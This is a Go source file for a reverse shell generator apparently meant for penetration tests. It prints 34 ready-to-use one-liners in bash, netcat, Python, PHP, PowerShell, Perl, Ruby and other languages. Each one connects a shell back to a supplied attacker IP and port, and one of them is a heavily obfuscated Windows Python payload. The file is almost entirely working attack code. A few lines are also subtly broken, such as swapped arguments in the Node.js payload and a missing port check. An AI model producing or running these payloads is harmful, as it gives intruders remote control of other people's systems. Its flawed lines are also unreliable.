package main

import (
	"fmt"
	"os"
	"strings"
)

const usage = `
Gorevpop Generate Reverse Shell
-------------------------------
Author: an4kein
Email: anakein@protonmail.ch

With this tool you can generate easy and sophisticated reverse shell commands to help you during penetration tests.

Usage: .\gorevpop <payload> <ip> <port>
Example: .\gorevpop 1 127.0.0.1 1337

Payloads list:

1 - BASH REVERSE SHELL (option 1)
2 - BASH REVERSE SHELL (option 2)
3 - BASH REVERSE SHELL (option 3)
4 - PERL REVERSE SHELL (option 1)
5 - PERL REVERSE SHELL (option 2)
6 - PERL REVERSE SHELL WINDOWS (option 3)
7 - RUBY REVERSE SHELL (option 1)
8 - RUBY REVERSE SHELL (option 2)
9 - RUBY REVERSE SHELL WINDOWS (option 3)
10 - NETCAT REVERSE SHELL (option 1)
11 - NETCAT REVERSE SHELL (option 2)
12 - NETCAT REVERSE SHELL (option 3)
13 - NETCAT REVERSE SHELL (option 4)
14 - NETCAT REVERSE SHELL (option 5)
15 - NCAT REVERSE SHELL
16 - PYTHON REVERSE SHELL (option 1)
17 - PYTHON REVERSE SHELL (option 2)
18 - PYTHON3 REVERSE SHELL (option 1)
19 - PYTHON3 REVERSE SHELL (option 2)
20 - PYTHON REVERSE SHELL WINDOWS 
21 - PHP REVERSE SHELL (option 1)
22 - PHP REVERSE SHELL (option 2)
23 - PHP REVERSE SHELL (option 3)
24 - PHP REVERSE SHELL (option 4)
25 - PHP REVERSE SHELL (option 5)
26 - PHP REVERSE SHELL (option 6)
27 - TELNET REVERSE SHELL (option 1)
28 - TELNET REVERSE SHELL (option 2)
29 - POWERSHELL REVERSE SHELL (option 1)
30 - POWERSHELL REVERSE SHELL (option 2)
31 - AWK REVERSE SHELL
32 - JAVA REVERSE SHELL
33 - NODE.JS REVERSE SHELL
34 - TCLSH REVERSE SHELL
`

func main() {
	if len(os.Args) < 3 {
		fmt.Println(strings.TrimSpace(usage))
		return
	}
	payload := os.Args[1]
	ip := os.Args[2]
	port := os.Args[3]
	if payload == "1" {
		fmt.Printf("\nbash -i >& /dev/tcp/%s/%s 0>&1\n",
			ip, port)
	} else if payload == "2" {
		fmt.Printf("\n0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196\n",
			ip, port)
	} else if payload == "3" {
		fmt.Printf("\nexec 5<> /dev/tcp/%s/%s; cat <&5 | while read line; do $line 2>&5>&5; done\n",
			ip, port)
	} else if payload == "4" {
		fmt.Printf("\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n",
			ip, port)
	} else if payload == "5" {
		fmt.Printf("\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n",
			ip, port)
	} else if payload == "6" {
		fmt.Printf("\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n",
			ip, port)
	} else if payload == "7" {
		fmt.Printf("\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n",
			ip, port)
	} else if payload == "8" {
		fmt.Printf("\nruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n",
			ip, port)
	} else if payload == "9" {
		fmt.Printf("\nruby -rsocket -e 'c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n",
			ip, port)
	} else if payload == "10" {
		fmt.Printf("\nnc -c /bin/sh %s %s\n",
			ip, port)
	} else if payload == "11" {
		fmt.Printf("\nnc -e /bin/sh %s %s\n",
			ip, port)
	} else if payload == "12" {
		fmt.Printf("\n/bin/sh | nc %s %s\n",
			ip, port)
	} else if payload == "13" {
		fmt.Printf("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n",
			ip, port)
	} else if payload == "14" {
		fmt.Printf("\nrm -f /tmp/p; mknod /tmp/p p && nc %s %s 0/tmp/p\n",
			ip, port)
	} else if payload == "15" {
		fmt.Printf("\nncat %s %s -e /bin/sh\n",
			ip, port)
	} else if payload == "16" {
		fmt.Printf("\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n",
			ip, port)
	} else if payload == "17" {
		fmt.Printf("\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'\n",
			ip, port)
	} else if payload == "18" {
		fmt.Printf("\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n",
			ip, port)
	} else if payload == "19" {
		fmt.Printf("\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'\n",
			ip, port)
	} else if payload == "20" {
		fmt.Printf("\nC:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('%s', %s)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n",
			ip, port)
	} else if payload == "21" {
		fmt.Printf("\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
			ip, port)
	} else if payload == "22" {
		fmt.Printf("\nphp -r '$s=fsockopen(\"%s\",%s);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
			ip, port)
	} else if payload == "23" {
		fmt.Printf("\nphp -r '$s=fsockopen(\"%s\",%s);`/bin/sh -i <&3 >&3 2>&3`;'\n",
			ip, port)
	} else if payload == "24" {
		fmt.Printf("\nphp -r '$s=fsockopen(\"%s\",%s);system(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
			ip, port)
	} else if payload == "25" {
		fmt.Printf("\nphp -r '$s=fsockopen(\"%s\",%s);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n",
			ip, port)
	} else if payload == "26" {
		fmt.Printf("\nphp -r '$sock=fsockopen(\"%s\",%s); $proc = proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'\n",
			ip, port)
	} else if payload == "27" {
		fmt.Printf("\nrm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p\n",
			ip, port)
	} else if payload == "28" {
		fmt.Printf("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %s > /tmp/f\n",
			ip, port)
	} else if payload == "29" {
		fmt.Printf("\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n",
			ip, port)
	} else if payload == "30" {
		fmt.Printf("\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n",
			ip, port)
	} else if payload == "31" {
		fmt.Printf("\nawk 'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n",
			ip, port)
	} else if payload == "32" {
		fmt.Printf("\nr = Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();\n",
			ip, port)
	} else if payload == "33" {
		fmt.Printf("\n(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(%s,\"%s\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\n",
			ip, port)
	} else if payload == "34" {
		fmt.Printf("\necho 'set s [socket %s %s;while 42 { puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n",
			ip, port)
	}
}
